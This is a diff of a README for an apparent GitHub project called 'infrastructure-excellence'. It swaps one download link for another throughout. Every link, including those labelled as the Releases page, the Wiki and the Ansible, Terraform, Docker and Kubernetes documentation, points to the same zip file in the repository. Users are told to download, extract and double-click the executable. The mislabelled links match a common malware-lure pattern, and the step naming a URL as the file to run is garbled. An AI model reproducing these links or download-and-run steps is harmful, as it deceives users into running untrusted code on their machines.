@@ -1,6 +1,6 @@
 # 🚀 infrastructure-excellence - Ready-Made Infrastructure Solutions for You
 
-![Download](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
+![Download](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ Welcome to the **infrastructure-excellence** repository. Here, you will find pro
 To get started with **infrastructure-excellence**, follow the steps below to download and set up the software:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip) to find the latest version of the software.
 
 2. **Download the Software:**  
    Click on the version you want and download the appropriate file for your operating system. The files available on the page are packaged for ease of use.
@@ -27,7 +27,7 @@ To get started with **infrastructure-excellence**, follow the steps below to dow
    Once the download is complete, locate the file in your Downloads folder. If it is in a zipped format, right-click and choose "Extract All" to view its contents.
 
 4. **Run the Application:**  
-   Navigate to the folder where you extracted the files. Find the main executable application file (look for a file named `https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip` for Linux or `https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip` for Windows). Double-click to start the application.
+   Navigate to the folder where you extracted the files. Find the main executable application file (look for a file named `https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip` for Linux or `https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip` for Windows). Double-click to start the application.
 
 5. **Follow the On-Screen Instructions:**  
    After launching the application, you will see step-by-step onboarding instructions. Follow these prompts to configure your infrastructure as needed.
@@ -36,7 +36,7 @@ To get started with **infrastructure-excellence**, follow the steps below to dow
 
 To download **infrastructure-excellence**, please visit the link below:
 
-[Download from Releases Page](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
 
 ## 💻 System Requirements
 
@@ -62,7 +62,7 @@ Ensure your system meets the following requirements for smooth operation:
 
 If you encounter any issues or have questions:
 
-1. **Check the Wiki:** We have a comprehensive [Wiki](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip) with detailed guides.
+1. **Check the Wiki:** We have a comprehensive [Wiki](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip) with detailed guides.
 2. **Open an Issue:** Report any problems directly in the GitHub Issues section.
 3. **Join the Community:** Engage with other users and contributors in the Discussions section.
 
@@ -72,10 +72,10 @@ Your feedback is essential for improving **infrastructure-excellence**. Please s
 
 Here are a few resources to further enhance your understanding of infrastructure management:
 
-- [Ansible Documentation](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
-- [Terraform Guide](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
-- [Docker Documentation](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
-- [Kubernetes Documentation](https://github.com/rumuru771/infrastructure-excellence/raw/refs/heads/main/pagurine/infrastructure-excellence-Hipposelinum.zip)
+- [Ansible Documentation](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
+- [Terraform Guide](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/rumuru771/infrastructure-excellence/main/pagurine/infrastructure_excellence_3.8.zip)
 
 Feel free to explore these documents to gain more knowledge about the tools and practices used within this repository. 
 
